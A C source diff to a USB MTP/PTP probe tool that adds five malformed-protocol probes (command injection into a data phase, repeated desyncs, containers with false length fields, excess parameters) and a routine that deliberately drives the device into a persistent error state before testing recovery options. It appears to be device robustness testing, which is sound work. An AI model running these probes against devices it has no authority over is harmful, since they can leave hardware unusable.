@@ -139,7 +139,8 @@ typedef struct {
     PTPParams params;
     PTP_USB *ptp_usb;                    /* == usbinfo from configure */
     LIBMTP_raw_device_t raw;
-    int open;
+    int open;                            /* 1=configured, 2=bare sessionless */
+    void *_bare_ctx;                     /* libusb ctx owned by bare_open */
 } Dev;
 
 /* kill the macOS Image Capture trio (user-owned daemons) */
@@ -353,10 +354,24 @@ static void baseline(Dev *d)
                      sids.Storage[i]);
             jr("op\":\"%s\",\"code\":\"0x1005\",\"resp_code\":\"0x%04x\"",
                namebuf, rc);
-            (void)xfer(d, "GetNumObjects", OC_GETNUMOBJECTS, 3,
-                       (const uint32_t[]){sids.Storage[i], 0, 0}, 1);
-            (void)xfer(d, "GetObjectHandles", OC_GETHANDLES, 3,
-                       (const uint32_t[]){sids.Storage[i], 0, 0}, 1);
+            /* GetNumObjects (0x1006) is broken/unimplemented on capmtp —
+             * returns custom 0x02FE AND poisons the next transaction.
+             * mtp-files parity: go straight to GetObjectHandles, parsed. */
+            {
+                PTPObjectHandles oh;
+                uint32_t k;
+                rc = ptp_getobjecthandles(&d->params,
+                                          0xFFFFFFFFu,  /* ALL storages —
+                     capmtp rejects the concrete ids it itself reports */
+                                          0, 0xFFFFFFFFu, &oh);  /* assoc = ROOT_PARENT */
+                jr("op\":\"GetObjectHandles\",\"code\":\"0x1007\","
+                   "\"resp_code\":\"0x%04x\",\"handle_count\":%u", rc,
+                   rc == RC_OK ? oh.n : 0);
+                for (k = 0; k < oh.n && k < 5; k++)
+                    jr("\"handle[%u]\":%u", k, oh.Handler[k]);
+                if (rc == RC_OK && oh.n)
+                    free(oh.Handler);
+            }
         }
         free(sids.Storage);
     }
@@ -464,6 +479,238 @@ static uint16_t p_untidy(Dev *d)
 { return xfer(d, "CloseSession(tid=bad)", OC_CLOSESESSION, 1,
               (const uint32_t[]){0xdeadbeefu}, 0); }
 
+/* ------------------------------------------------------------------ */
+/* corpus v2 — escalation round (2026-11-11 live findings): the         */
+/* data-phase desync leaves a PERSISTENT 0x02FF (PTP_ERROR_IO) zombie   */
+/* that survives reconnects; recovery so far only console-side.         */
+
+/* raw bulk I/O on the same endpoints the glue callbacks use */
+static int raw_bulk_read(Dev *d, void *buf, int len, int timeout_ms)
+{
+    int xfr = 0;
+    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->inep,
+                                  (unsigned char *)buf, len, &xfr,
+                                  timeout_ms);
+    jr("raw_read\":\"%d bytes / rc %d%s\"", xfr, rc,
+       rc == LIBUSB_ERROR_TIMEOUT ? " (timeout)" : "");
+    return (rc == LIBUSB_SUCCESS) ? xfr : -1;
+}
+
+static int raw_bulk_write(Dev *d, const void *buf, int len)
+{
+    int xfr = 0;
+    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->outep,
+                                  (unsigned char *)buf, len, &xfr, 5000);
+    return (rc == LIBUSB_SUCCESS && xfr == len) ? 0 : -1;
+}
+
+/* send a request container WITHOUT any transaction machinery */
+static uint16_t raw_sendreq(Dev *d, const char *tag, uint16_t code,
+                            int nparam, const uint32_t *pv, int dataphase)
+{
+    PTPContainer ptp;
+    uint16_t rc;
+    memset(&ptp, 0, sizeof(ptp));
+    ptp.Code = code;
+    ptp.Nparam = nparam;
+    if (nparam > 0) ptp.Param1 = pv[0];
+    if (nparam > 1) ptp.Param2 = pv[1];
+    if (nparam > 2) ptp.Param3 = pv[2];
+    ptp.Transaction_ID = d->params.transaction_id++;
+    rc = d->params.sendreq_func(&d->params, &ptp, dataphase);
+    jr("op\":\"%s\",\"code\":\"0x%04x\",\"txid\":%u,\"resp_code\":\"0x%04x\"",
+       tag, code, (unsigned)ptp.Transaction_ID, rc);
+    return rc;
+}
+
+/* the desync core: GetObject request whose data phase is never consumed */
+static uint16_t desync_getobject(Dev *d, const char *tag, uint32_t handle)
+{
+    uint32_t p = handle;
+    return raw_sendreq(d, tag, OC_GETOBJECT, 1, &p, PTP_DP_GETDATA);
+}
+
+/*
+ * v2-1 midstream_inject: begin GetObject(h) for a REAL handle, consume
+ * ONLY the 12-byte DATA container header, then immediately write a second
+ * command container (GetStorageIDs) INTO the pending data phase.
+ */
+static uint16_t p_midstream(Dev *d)
+{
+    unsigned char data_hdr[12];
+    uint32_t handles[256];
+    unsigned int recvlen = 0, n = 0, i;
+    unsigned char *data = NULL;
+    uint16_t rc;
+    PTPContainer ptp;
+    double t0;
+
+    /* get a real handle first (album may be empty -> clean skip) */
+    memset(&ptp, 0, sizeof(ptp));
+    ptp.Code = OC_GETHANDLES;
+    ptp.Nparam = 3;
+    ptp.Param1 = 0; ptp.Param2 = 0; ptp.Param3 = 0xFFFFFFFFu;
+    rc = ptp_transaction(&d->params, &ptp, PTP_DP_GETDATA, 0, &data,
+                         &recvlen);
+    if (rc != RC_OK || recvlen < 4 || !data) {
+        jr("op\":\"GetObjectHandles(real)\",\"resp_code\":\"0x%04x\","
+           "\"detail\":\"handles unavailable\"", rc);
+        jr("probe\":\"midstream_inject\",\"SKIP\":\"no-objects\"");
+        return rc ? rc : PTP_RC_GeneralError;
+    }
+    n = ((uint32_t *)data)[0];
+    if (n > 255) n = 255;
+    for (i = 0; i < n; i++) handles[i] = ((uint32_t *)data)[1 + i];
+    free(data);
+    if (n == 0) {
+        jr("probe\":\"midstream_inject\",\"SKIP\":\"no-objects\","
+           "\"detail\":\"album empty\"");
+        return RC_OK;
+    }
+    jr("op\":\"GetObjectHandles(real)\",\"resp_code\":\"0x%04x\","
+       "\"handles\":%u,\"first\":\"0x%08x\"", rc, n, handles[0]);
+
+    /* begin GetObject(h) and consume ONLY the 12-byte DATA header */
+    (void)desync_getobject(d, "GetObject(real) begin", handles[0]);
+    t0 = now_ms();
+    {
+        int got = raw_bulk_read(d, data_hdr, 12, 5000);
+        if (got >= 12) {
+            jr("op\":\"consume-data-header\",\"data_len_field\":\"0x%x\","
+               "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"ms\":%.2f",
+               ((uint32_t *)data_hdr)[0], ((uint16_t *)data_hdr)[2],
+               ((uint16_t *)data_hdr)[3], now_ms() - t0);
+        } else {
+            jr("op\":\"consume-data-header\",\"detail\":\"no 12-byte "
+               "header read\",\"ms\":%.2f", now_ms() - t0);
+            /* nothing consumed: still inject; the violation stands */
+        }
+    }
+
+    /* the violation: a second COMMAND container into the data phase */
+    t0 = now_ms();
+    (void)raw_sendreq(d, "GetStorageIDs INJECTED into data phase",
+                      OC_GETSTORAGEIDS, 0, NULL, PTP_DP_NODATA);
+    /* then try to read what comes back */
+    {
+        unsigned char buf[64];
+        int got = raw_bulk_read(d, buf, sizeof(buf), 5000);
+        if (got >= 12) {
+            jr("op\":\"post-inject-read\",\"len_field\":\"0x%x\","
+               "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"ms\":%.2f",
+               ((uint32_t *)buf)[0], ((uint16_t *)buf)[2],
+               ((uint16_t *)buf)[3], now_ms() - t0);
+        } else {
+            jr("op\":\"post-inject-read\",\"detail\":\"nothing readable\","
+               "\"ms\":%.2f", now_ms() - t0);
+        }
+    }
+    return RC_OK;
+}
+
+/*
+ * v2-2 double_desync: one desync, 1s pause, then a FULL command sequence
+ * on the SAME connection (OpenSession + GetStorageIDs + a second desync).
+ * Fixed-size pending-transaction tables may collide/overflow.
+ */
+static uint16_t p_double_desync(Dev *d)
+{
+    uint32_t one = 1;
+    (void)desync_getobject(d, "GetObject desync #1", 1);
+    jr("op\":\"double-desync\",\"detail\":\"waiting 1s with pending data "
+       "phase\"");
+    sleep(1);
+    (void)xfer(d, "OpenSession (after desync#1)", OC_OPENSESSION, 1, &one, 0);
+    (void)xfer(d, "GetStorageIDs (after desync#1)", OC_GETSTORAGEIDS, 0,
+               NULL, 1);
+    (void)desync_getobject(d, "GetObject desync #2", 1);
+    (void)xfer(d, "GetStorageIDs (after desync#2)", OC_GETSTORAGEIDS, 0,
+               NULL, 1);
+    jr("op\":\"double-desync\",\"detail\":\"sequence complete on one "
+       "connection\"");
+    return RC_OK;
+}
+
+/*
+ * v2-3 length_lie_cmd: command containers whose length header lies
+ * (0xFFFFFFFF, then 0) around a valid GetStorageIDs body.
+ * Layout: u32 len | u16 type(1=CMD) | u16 code | u32 txid => 12 bytes.
+ */
+static uint16_t send_liar(Dev *d, uint32_t lie, const char *tag)
+{
+    unsigned char c[12];
+    uint32_t tx = d->params.transaction_id++;
+    unsigned char rbuf[64];
+    double t0 = now_ms();
+    ((uint32_t *)c)[0] = lie;
+    ((uint16_t *)c)[2] = 1;               /* container type: COMMAND */
+    ((uint16_t *)c)[3] = OC_GETSTORAGEIDS;
+    ((uint32_t *)c)[2] = tx;              /* trans_id at offset 8 */
+    if (raw_bulk_write(d, c, 12) == 0) {
+        int got = raw_bulk_read(d, rbuf, sizeof(rbuf), 5000);
+        jr("op\":\"%s\",\"len_field\":\"0x%x\",\"read\":%d,\"ms\":%.2f",
+           tag, lie, got, now_ms() - t0);
+        if (got >= 12)
+            jr("op\":\"%s-resp\",\"len_field\":\"0x%x\",\"type\":\"0x%04x\","
+               "\"code\":\"0x%04x\"", tag, ((uint32_t *)rbuf)[0],
+               ((uint16_t *)rbuf)[2], ((uint16_t *)rbuf)[3]);
+    } else {
+        jr("op\":\"%s\",\"detail\":\"write failed\"", tag);
+    }
+    return RC_OK;
+}
+
+static uint16_t p_length_lie(Dev *d)
+{
+    (void)send_liar(d, 0xFFFFFFFFu, "length-lie 0xFFFFFFFF");
+    (void)xfer(d, "post-lie health", OC_GETSTORAGEIDS, 0, NULL, 1);
+    (void)send_liar(d, 0, "length-lie 0");
+    return xfer(d, "post-lie health 2", OC_GETSTORAGEIDS, 0, NULL, 1);
+}
+
+/*
+ * v2-4 zombie_window: desync, then DURING the ~20s deadlock window fire
+ * GetStorageIDs every 500ms x 40 (short per-op timeout so one hang cannot
+ * eat the window). Any response-code change mid-window is signal.
+ */
+static uint16_t p_zombie_window(Dev *d)
+{
+    enum { N = 40, STEP_MS = 500 };
+    uint16_t prev = 0xFFFF, rc;
+    int save_timeout = (int)d->ptp_usb->timeout;
+    int i;
+    (void)desync_getobject(d, "GetObject desync (zombie window)", 1);
+    d->ptp_usb->timeout = 1500;           /* map the window, don't eat it */
+    for (i = 0; i < N; i++) {
+        double t0 = now_ms();
+        rc = xfer(d, "zombie-window ping", OC_GETSTORAGEIDS, 0, NULL, 1);
+        jr("zombie_window\":{\"i\":%d,\"resp_code\":\"0x%04x\",\"ms\":%.2f}",
+           i, rc, now_ms() - t0);
+        if (prev != 0xFFFF && rc != prev)
+            jr("ZOMBIE_WINDOW_SIGNAL\":\"resp changed 0x%04x -> 0x%04x at "
+               "ping %d", prev, rc, i);
+        prev = rc;
+        if (now_ms() - t0 < STEP_MS)
+            usleep((useconds_t)((STEP_MS - (int)(now_ms() - t0)) * 1000));
+    }
+    d->ptp_usb->timeout = save_timeout;
+    return prev;
+}
+
+/*
+ * v2-5 param_count_abuse: OpenSession with FIVE u32 params (container
+ * 12+20) and GetStorageIDs with three — per-op param-count parsers may
+ * mishandle the mismatch.
+ */
+static uint16_t p_param_count(Dev *d)
+{
+    (void)xfer(d, "OpenSession(5 params)", OC_OPENSESSION, 5,
+               (const uint32_t[]){1, 0xAA, 0xBB, 0xCC, 0xDD}, 0);
+    (void)xfer(d, "GetStorageIDs(3 params)", OC_GETSTORAGEIDS, 3,
+               (const uint32_t[]){1, 2, 3}, 1);
+    return xfer(d, "post-abuse health", OC_GETSTORAGEIDS, 0, NULL, 1);
+}
+
 static void corpus_init(void)
 {
     if (n_probes) return;
@@ -481,6 +728,229 @@ static void corpus_init(void)
     reg("sendobject_rejectpath", p_sendobj);
     reg("session_reopen", p_reopen);
     reg("closesession_untidy", p_untidy);
+    /* corpus v2 (escalation round) */
+    reg("midstream_inject", p_midstream);
+    reg("double_desync", p_double_desync);
+    reg("length_lie_cmd", p_length_lie);
+    reg("zombie_window", p_zombie_window);
+    reg("param_count_abuse", p_param_count);
+}
+
+
+/* ------------------------------------------------------------------ */
+/* --probe-zombie-recovery: trigger the 0x02FF zombie, then attempt    */
+/* EVERY conceivable in-band recovery, each on a FRESH reconnect.      */
+/* Live intel says only console-side reconnect works — prove it        */
+/* exhaustively. Candidates needing a SESSIONLESS start use bare_open  */
+/* (own libusb open + claim + the exported glue I/O callbacks), because */
+/* configure_usb_device itself dies at opensession once zombied.        */
+
+/* bare sessionless open: our own claim + the glue's I/O callbacks */
+static int bare_open(Dev *d)
+{
+    libusb_context *ctx = NULL;
+    libusb_device **list = NULL;
+    ssize_t n, i;
+    libusb_device_handle *h = NULL;
+    struct libusb_config_descriptor *cfg = NULL;
+    const struct libusb_interface_descriptor *ifc;
+    PTPParams *p;
+    PTP_USB *u;
+    int k;
+
+    memset(d, 0, sizeof(*d));
+    if (libusb_init(&ctx) != LIBUSB_SUCCESS) return -1;
+    d->_bare_ctx = ctx;
+    n = libusb_get_device_list(ctx, &list);
+    for (i = 0; i < n; i++) {
+        struct libusb_device_descriptor dd;
+        if (libusb_get_device_descriptor(list[i], &dd) == LIBUSB_SUCCESS &&
+            dd.idVendor == VID && dd.idProduct == PID) {
+            if (libusb_open(list[i], &h) == LIBUSB_SUCCESS) break;
+        }
+    }
+    libusb_free_device_list(list, 1);
+    if (!h) { jr("bare_open\":\"no device\""); goto fail; }
+    if (libusb_get_active_config_descriptor(libusb_get_device(h), &cfg)
+        != LIBUSB_SUCCESS) { jr("bare_open\":\"no config descriptor\""); goto fail; }
+    ifc = &cfg->interface[0].altsetting[0];
+    u = (PTP_USB *)calloc(1, sizeof(PTP_USB));
+    u->handle = h;
+    u->interface = 0;
+    u->timeout = 20000;
+    for (k = 0; k < ifc->bNumEndpoints; k++) {
+        const struct libusb_endpoint_descriptor *e = &ifc->endpoint[k];
+        int dir = e->bEndpointAddress & 0x80;
+        int type = e->bmAttributes & 3;
+        if (type == LIBUSB_TRANSFER_TYPE_BULK) {
+            if (dir == LIBUSB_ENDPOINT_IN) {
+                u->inep = e->bEndpointAddress;
+                u->inep_maxpacket = e->wMaxPacketSize;
+            } else {
+                u->outep = e->bEndpointAddress;
+                u->outep_maxpacket = e->wMaxPacketSize;
+            }
+        }
+    }
+    libusb_free_config_descriptor(cfg);
+    if (!u->inep || !u->outep) { jr("bare_open\":\"no bulk pair\""); free(u); goto fail; }
+    if (libusb_claim_interface(h, 0) != LIBUSB_SUCCESS) {
+        jr("bare_open\":\"claim failed\""); free(u); goto fail;
+    }
+    p = &d->params;
+    memset(p, 0, sizeof(*p));
+    p->sendreq_func = ptp_usb_sendreq;   /* exported by glue.o */
+    p->senddata_func = ptp_usb_senddata;
+    p->getresp_func = ptp_usb_getresp;
+    p->getdata_func = ptp_usb_getdata;
+    p->data = u;
+    p->byteorder = PTP_DL_LE;
+    p->cd_locale_to_ucs2 = iconv_open("UTF-16LE", "UTF-8");
+    p->cd_ucs2_to_locale = iconv_open("UTF-8", "UTF-16LE");
+    d->ptp_usb = u;
+    d->open = 2;                          /* bare: close path differs */
+    jr("bare_open\":\"ok (sessionless, own claim)\"");
+    return 0;
+fail:
+    if (h) libusb_close(h);
+    libusb_exit(ctx);
+    return -1;
+}
+
+static void dev_close_any(Dev *d)
+{
+    if (d->open == 2) {
+        libusb_release_interface(d->ptp_usb->handle, d->ptp_usb->interface);
+        libusb_close(d->ptp_usb->handle);
+        if (d->_bare_ctx) libusb_exit(d->_bare_ctx);
+        if (d->params.cd_locale_to_ucs2 != (iconv_t)-1)
+            iconv_close(d->params.cd_locale_to_ucs2);
+        if (d->params.cd_ucs2_to_locale != (iconv_t)-1)
+            iconv_close(d->params.cd_ucs2_to_locale);
+        memset(d, 0, sizeof(*d));
+        return;
+    }
+    dev_close(d);
+}
+
+/* one recovery candidate: fresh reconnect, candidate ops, health, close */
+static int try_candidate(const char *cand, int sessionless,
+                         uint16_t code, int nparam, const uint32_t *pv,
+                         const char *cand_opname)
+{
+    Dev d;
+    uint16_t health;
+    int connected;
+
+    jr("zombie_recovery\":{\"candidate\":\"%s\",\"sessionless\":%s",
+       cand, sessionless ? "true" : "false");
+    if (sessionless) {
+        connected = (bare_open(&d) == 0);
+        if (!connected) {
+            jr("zombie_recovery_result\":\"%s\",\"outcome\":\"bare open "
+               "failed (zombie may block even the claim/transport)\"", cand);
+            return 0;
+        }
+    } else {
+        connected = (dev_open(&d) == 0);
+        if (!connected) {
+            jr("zombie_recovery_result\":\"%s\",\"outcome\":\"fresh "
+               "reconnect REJECTED at OpenSession (zombie persists across "
+               "reconnect)\"", cand);
+            return 0;
+        }
+    }
+    if (!sessionless && code) {
+        PTPContainer ptp;
+        unsigned char *data = NULL;
+        uint16_t rc;
+        memset(&ptp, 0, sizeof(ptp));
+        ptp.Code = code;
+        ptp.Nparam = nparam;
+        if (nparam > 0) ptp.Param1 = pv[0];
+        if (nparam > 1) ptp.Param2 = pv[1];
+        rc = ptp_transaction(&d.params, &ptp, PTP_DP_NODATA, 0, NULL, NULL);
+        jr("zombie_cand_op\":\"%s\",\"resp_code\":\"0x%04x\"",
+           cand_opname, rc);
+        (void)data;
+    }
+    if (sessionless) {
+        /* sessionless op: GetDeviceInfo / GetStorageIDs with NO session */
+        PTPContainer ptp;
+        unsigned char *data = NULL;
+        unsigned int recvlen = 0;
+        uint16_t rc;
+        memset(&ptp, 0, sizeof(ptp));
+        ptp.Code = code;                  /* 0x1001 or 0x1004 */
+        ptp.Nparam = 0;
+        rc = ptp_transaction(&d.params, &ptp, PTP_DP_GETDATA, 0, &data,
+                             &recvlen);
+        jr("zombie_cand_op\":\"%s\",\"resp_code\":\"0x%04x\",\"data_len\":%u",
+           cand_opname, rc, recvlen);
+        if (data) free(data);
+        health = rc;
+    } else {
+        health = xfer(&d, "post-candidate health", OC_GETSTORAGEIDS, 0,
+                      NULL, 1);
+    }
+    jr("zombie_recovery_result\":\"%s\",\"outcome\":\"%s\",\"health\":"
+       "\"0x%04x\"", cand, health == RC_OK ? "RECOVERED" : "still-zombie",
+       health);
+    dev_close_any(&d);
+    return health == RC_OK;
+}
+
+static int probe_zombie_recovery(void)
+{
+    Dev d;
+    uint16_t health;
+    int any_recovered = 0;
+    static const uint32_t one = 1, dead = 0xdeadbeefu,
+                          big = 0xFFFFFFFFu;
+
+    /* 1. establish the zombie on one connection */
+    if (dev_open(&d) < 0) {
+        jr("zombie_recovery\":\"dev_open failed before trigger — device "
+           "already zombied or absent\"");
+        return 1;
+    }
+    (void)session_op(&d);
+    (void)desync_getobject(&d, "GetObject desync (zombie trigger)", 1);
+    health = xfer(&d, "post-trigger health", OC_GETSTORAGEIDS, 0, NULL, 1);
+    jr("zombie_trigger\":\"desync sent\",\"health_after\":\"0x%04x\"}", health);
+    dev_close(&d);
+    if (health == RC_OK) {
+        jr("zombie_recovery\":\"NOT zombied — trigger failed to induce "
+           "0x02FF; recovery candidates moot this run\"");
+        return 0;
+    }
+    sleep(1);
+
+    /* 2. exhaustive in-band candidates, each on a FRESH reconnect */
+    any_recovered |= try_candidate("double-open(1,1)", 0, OC_OPENSESSION, 1,
+                                   &one, "OpenSession(1) after open");
+    any_recovered |= try_candidate("open(id=0)", 0, OC_OPENSESSION, 1,
+                                   &(uint32_t){0}, "OpenSession(0)");
+    any_recovered |= try_candidate("open(id=0xdeadbeef)", 0, OC_OPENSESSION,
+                                   1, &dead, "OpenSession(0xdeadbeef)");
+    any_recovered |= try_candidate("open(id=max)", 0, OC_OPENSESSION, 1,
+                                   &big, "OpenSession(0xFFFFFFFF)");
+    any_recovered |= try_candidate("close(1)", 0, OC_CLOSESESSION, 1, &one,
+                                   "CloseSession(1)");
+    any_recovered |= try_candidate("close(0xdeadbeef)", 0, OC_CLOSESESSION,
+                                   1, &dead, "CloseSession(0xdeadbeef)");
+    any_recovered |= try_candidate("sessionless GetDeviceInfo", 1,
+                                   OC_GETDEVICEINFO, 0, NULL,
+                                   "GetDeviceInfo(sessionless)");
+    any_recovered |= try_candidate("sessionless GetStorageIDs", 1,
+                                   OC_GETSTORAGEIDS, 0, NULL,
+                                   "GetStorageIDs(sessionless)");
+
+    jr("zombie_recovery_verdict\":\"%s\"", any_recovered ?
+       "AN IN-BAND RECOVERY WORKED (see candidate results)" :
+       "NO in-band recovery exists; console-side reconnect required "
+       "(proven exhaustively)");
+    return any_recovered ? 0 : 1;
 }
 
 /* one hostile probe: fresh connect + session + probe + health + close */
@@ -519,15 +989,15 @@ static int self_test(void)
 {
     int ok = 1;
     corpus_init();
-    printf("  %-48s %s\n", "corpus size (== mtp_probe.py)",
-           n_probes == 14 ? "PASS" : "FAIL");
-    ok &= (n_probes == 14);
+    printf("  %-48s %s\n", "corpus v2 size (v1 14 + v2 5)",
+           n_probes == 19 ? "PASS" : "FAIL");
+    ok &= (n_probes == 19);
     printf("  %-48s %s\n", "opcode values",
            (OC_GETTHUMB == 0x100a && OC_GETOBJECT == 0x1009 &&
             OC_GETHANDLES == 0x1007) ? "PASS" : "FAIL");
     ok &= (OC_GETTHUMB == 0x100a && OC_GETOBJECT == 0x1009 &&
            OC_GETHANDLES == 0x1007);
-    printf("  %-48s %s\n", "probe names match python corpus",
+    printf("  %-48s %s\n", "v1 prefix == mtp_probe.py corpus",
            (strcmp(PROBES[0].name, "getobjectinfo_handle_zero") == 0 &&
             strcmp(PROBES[6].name, "getobject_partial_nodata") == 0 &&
             strcmp(PROBES[13].name, "closesession_untidy") == 0)
@@ -535,6 +1005,18 @@ static int self_test(void)
     ok &= (strcmp(PROBES[0].name, "getobjectinfo_handle_zero") == 0 &&
            strcmp(PROBES[6].name, "getobject_partial_nodata") == 0 &&
            strcmp(PROBES[13].name, "closesession_untidy") == 0);
+    printf("  %-48s %s\n", "v2 additions registered",
+           (strcmp(PROBES[14].name, "midstream_inject") == 0 &&
+            strcmp(PROBES[15].name, "double_desync") == 0 &&
+            strcmp(PROBES[16].name, "length_lie_cmd") == 0 &&
+            strcmp(PROBES[17].name, "zombie_window") == 0 &&
+            strcmp(PROBES[18].name, "param_count_abuse") == 0)
+           ? "PASS" : "FAIL");
+    ok &= (strcmp(PROBES[14].name, "midstream_inject") == 0 &&
+           strcmp(PROBES[15].name, "double_desync") == 0 &&
+           strcmp(PROBES[16].name, "length_lie_cmd") == 0 &&
+           strcmp(PROBES[17].name, "zombie_window") == 0 &&
+           strcmp(PROBES[18].name, "param_count_abuse") == 0);
     printf("mtp_probe_libpt2 self-test: %s\n", ok ? "PASS" : "FAIL");
     return ok ? 0 : 1;
 }
@@ -544,13 +1026,17 @@ static void usage(void)
     fprintf(stderr,
         "usage: mtp_probe_libpt2 --baseline | --probe NAME | --suite | "
         "--list | --self-test\n"
-        "                    [--runs-dir DIR] [--wait SEC]\n");
+        "                    --probe-zombie-recovery "
+        "[--runs-dir DIR] [--wait SEC]\n"
+        "corpus: v1 (14, == mtp_probe.py) + v2 (5: midstream_inject, "
+        "double_desync, length_lie_cmd, zombie_window, param_count_abuse)\n");
 }
 
 int main(int argc, char **argv)
 {
     const char *runs_dir = NULL, *probe_name = NULL;
     int do_baseline = 0, do_suite = 0, do_list = 0, do_self = 0, wait_s = 0;
+    int do_zombie_rec = 0;
     int i;
     char defdir[512];
 
@@ -559,6 +1045,7 @@ int main(int argc, char **argv)
         else if (!strcmp(argv[i], "--suite")) do_suite = 1;
         else if (!strcmp(argv[i], "--list")) do_list = 1;
         else if (!strcmp(argv[i], "--self-test")) do_self = 1;
+        else if (!strcmp(argv[i], "--probe-zombie-recovery")) do_zombie_rec = 1;
         else if (!strcmp(argv[i], "--probe") && i + 1 < argc)
             probe_name = argv[++i];
         else if (!strcmp(argv[i], "--runs-dir") && i + 1 < argc)
@@ -573,7 +1060,9 @@ int main(int argc, char **argv)
         for (i = 0; i < n_probes; i++) printf("  %s\n", PROBES[i].name);
         return 0;
     }
-    if (!do_baseline && !do_suite && !probe_name) { usage(); return 2; }
+    if (!do_baseline && !do_suite && !probe_name && !do_zombie_rec) {
+        usage(); return 2;
+    }
 
     if (!runs_dir) {
         const char *slash = strrchr(argv[0], '/');
@@ -617,6 +1106,8 @@ int main(int argc, char **argv)
         dev_close(&d);
     } else if (probe_name) {
         run_probe(probe_name);
+    } else if (do_zombie_rec) {
+        return probe_zombie_recovery();
     } else if (do_suite) {
         for (i = 0; i < n_probes; i++) {
             printf("[*] probe: %s\n", PROBES[i].name);
